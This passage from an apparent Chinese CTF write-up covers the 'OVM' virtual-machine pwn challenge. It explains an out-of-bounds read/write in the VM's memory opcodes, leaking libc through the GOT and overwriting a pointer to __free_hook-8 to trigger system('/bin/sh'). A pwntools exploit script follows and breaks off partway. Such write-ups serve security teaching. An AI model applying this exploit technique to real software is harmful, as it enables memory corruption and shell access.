  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x30</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token number">0x50u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0x50</span>
        <span class="token function">LODWORD</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//读取SP</span>
        reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> result <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//SP+1</span>
        result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result<span class="token punctuation">;</span>
        stack<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将寄存器中的值压入栈中</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x60u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0x60</span>
        <span class="token operator">--</span>reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//SP降低</span>
        result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>
        reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">[</span>reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//读取栈值到寄存器中</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x40u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0x40</span>
        result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>memory<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//读取内存的值</span>
        memory<span class="token punctuation">[</span>reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将寄存器中的值写入内存中</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x10</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0x10</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>
    reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>a1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将一个常数存入寄存器</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x20</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0x20</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span> 
    reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>a1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>分析完功能，我们可以发现在读取和写入内存并没有作出限制，存在越界读写漏洞，我们先将opcode封装成函数</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#reg[v4] = reg[v2] + reg[v3]</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#reg[v4] = reg[v3] - reg[v2]</span>
<span class="token keyword">def</span> <span class="token function">sub</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#reg[v4] = reg[v2] &amp; reg[v3]</span>
<span class="token keyword">def</span> <span class="token function">AND</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#reg[v4] = reg[v2] | reg[v3]</span>
<span class="token keyword">def</span> <span class="token function">OR</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#reg[v4] = reg[v2] ^ reg[v3]</span>
<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#reg[v4] = reg[v3] >> reg[v2]</span>
<span class="token keyword">def</span> <span class="token function">right_shift</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#reg[v4] = reg[v3] &lt;&lt; reg[v2]</span>
<span class="token keyword">def</span> <span class="token function">left_shift</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#reg[v4] = memory[reg[v2]]</span>
<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#memory[reg[v2]] = reg[v4]</span>
<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#reg[v4] = (unsigned __int8)v2</span>
<span class="token keyword">def</span> <span class="token function">setnum</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
<p>程序的功能理清了，该怎样利用，注意到sendcomment函数</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">sendcomment</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">free</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>sendcomment会free掉comment[0]中指针指向的chunk，在此之前程序允许我们往comment[0]指向的chunk写入数据，所以我们可以利用越界写将comment[0]指针改写到free_hook-8的位置，然后一次性写入’/bin/sh’+system的地址，这样后面free(comment[0])就会触发system(‘/bin/sh’)</p>
<p>首先我们需要泄露libc地址，bss段上方一段距离就是got表，我们通过越界读将got表中的libc地址读取到寄存器中，这里需要注意的是，由于寄存器是双字，也就是四字节的，而地址是八字节的，所以我们需要两个寄存器才能存储一个地址</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C9.jpg" alt="9"></p>
<p>got表中最后一个是stderr，不过我们不选它来泄露，因为stderr地址的最后两位是00，在这里我们选择stdin来泄露,因为后续我们需要通过stdin的地址来计算得到__free_hook-8,因此尽量选择与free_hook地址相差较小的来泄露,能够减小计算量。</p>
<p>有了泄露目标之后，就该来计算索引了(reg[v4] = memory[reg[v2]])。memory的地址是0x202060，stdin@got的地址为0x201f80，memory也是双字类型，于是有n=(0x202060-0x201f80)/4=56，索引就是-56</p>
<p>该如何构造出-56，可以通过在内存中负数的存储方式来构造，0xffffffc8在内存中就表示-56，通过-56读取stdin地址的后四字节，通过-55读取前四个字节。如何得到0xffffffc8，可以通过ff左移位和加法运算得到，构造步骤如下</p>
<pre class=" language-python"><code class="language-python">setnum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[0]=8</span>
setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=0xff</span>
setnum<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=0xff</span>
left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xff&lt;&lt;8=0xff00)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+reg[1](reg[2]=0xff00+0xff=0xffff)</span>
left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffff&lt;&lt;8=0xffff00)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+reg[1](reg[2]=0xffff00+0xff=0xffffff)</span>
setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=0xc8</span>
left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffffff&lt;&lt;8=0xffffff00)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+reg[1](reg[2]=0xffffff00+0xc8=0xffffffc8=-56)</span></code></pre>
<p>然后我们读取stdin的地址，存入两个寄存器中</p>
<pre class=" language-python"><code class="language-python">read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[3]=memory[reg[2]]=memory[-56]</span>
setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=1</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+reg[1]=-56+1=-55</span>
read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[4]=memory[reg[2]]=memory[-55]</span></code></pre>
<p>有了stdin地址之后，我们计算出stdin和free_hook-8的偏移，通过add将偏移加到存储stdin地址的寄存器之上，再写入comment[0]即可，comment[0]与memory的相对索引是-8</p>
<pre class=" language-python"><code class="language-python">setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=0x10</span>
left_shift<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=reg[1]&lt;&lt;8=0x10&lt;&lt;8=0x1000</span>
setnum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[0]=0x90</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=reg[1]+reh[0]=0x1000+0x90=0x1090 &amp;free_hook-8-&amp;stdin=0x1090</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[3]=reg[3]+reg[1]=&amp;stdin后四字节+0x1090=&amp;free_hook-8后四字节</span>
setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=47</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+2=-55+47=-8</span>
write<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#memory[reg[2]]=memory[-8]=reg[3]</span>
setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=1</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+1=-8+1=-7</span>
write<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#memory[reg[2]]=memory[-7]=reg[4]</span>
u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#exit</span></code></pre>
<p>完整exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./OVM'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./OVM'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'OVM'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true">#reg[v4] = reg[v2] + reg[v3]</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#reg[v4] = reg[v3] &lt;&lt; reg[v2]</span>


<span class="token keyword">def</span> <span class="token function">left_shift</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#reg[v4] = memory[reg[v2]]</span>


<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#memory[reg[v2]] = reg[v4]</span>


<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># reg[v4] = (unsigned __int8)v2</span>


<span class="token keyword">def</span> <span class="token function">setnum</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


code <span class="token operator">=</span> <span class="token punctuation">[</span>
    setnum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[0]=8</span>
    setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[1]=0xff</span>
    setnum<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># reg[2]=0xff</span>
